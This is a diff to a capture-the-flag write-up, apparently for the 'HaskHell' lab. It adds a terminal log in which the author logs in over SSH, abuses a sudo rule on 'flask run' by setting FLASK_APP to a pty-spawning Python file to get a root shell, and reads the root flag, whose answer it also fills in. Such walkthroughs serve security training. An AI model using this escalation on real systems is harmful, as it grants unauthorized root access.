@@ -168,7 +168,7 @@ It is still time ...</p>
 
 
 > 1.2. <em>Obtain the flag in root.txt.</em><br><a id='1.2'></a>
->> <strong><code>___</code></strong><br>
+>> <strong><code>flag{im_purely_functional}</code></strong><br>
 <p></p>
 
 <br><br>
@@ -203,10 +203,60 @@ It is still time ...</p>
 
 ![image](https://github.com/user-attachments/assets/6d650dd2-1c55-4eec-810d-c22b898a1bbf)
 
+<br>
+
+<p>Goot access as <code>root</code>.</p>
+
+<br>
+
+```bash
+:~/HaskHell# nano id_rsa
+:~/HaskHell# chmod 600 id_rsa
+:~/HaskHell# ssh -i id_rsa prof@10.10.196.189
+...
+$ whoami
+prof
+$ bash
+prof@haskhell:~$ sudo -l
+Matching Defaults entries for prof on haskhell:
+    env_reset, env_keep+=FLASK_APP, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User prof may run the following commands on haskhell:
+    (root) NOPASSWD: /usr/bin/flask run
+prof@haskhell:~$ sudo /usr/bin/flask run
+Usage: flask run [OPTIONS]
+
+Error: Could not locate Flask application. You did not provide the FLASK_APP environment variable.
+
+For more information see http://flask.pocoo.org/docs/latest/quickstart/
+prof@haskhell:~$ 
+prof@haskhell:~$ echo 'import pty;pty.spawn("/bin/bash")' > privilege.py
+prof@haskhell:~$ cat privilege.py
+import pty;pty.spawn("/bin/bash")
+prof@haskhell:~$ export FLASK_APP=privilege.py
+prof@haskhell:~$ sudo /usr/bin/flask run
+root@haskhell:~# pwd
+/home/prof
+root@haskhell:~# cd /root
+root@haskhell:/root# ls
+root.txt
+root@haskhell:/root# cat root.txt
+flag{im_purely_functional}
+root@haskhell:/root# 
+```
+
+<br>
+<br>
 
 
 
-![image](https://github.com/user-attachments/assets/c5788e20-aea0-4a09-8cf4-c73909c4fafd)
+![image](https://github.com/user-attachments/assets/5627a792-ea2b-4ba1-a925-65a6ac4225dd)
+
+
+<
+
+
+
 
 
 
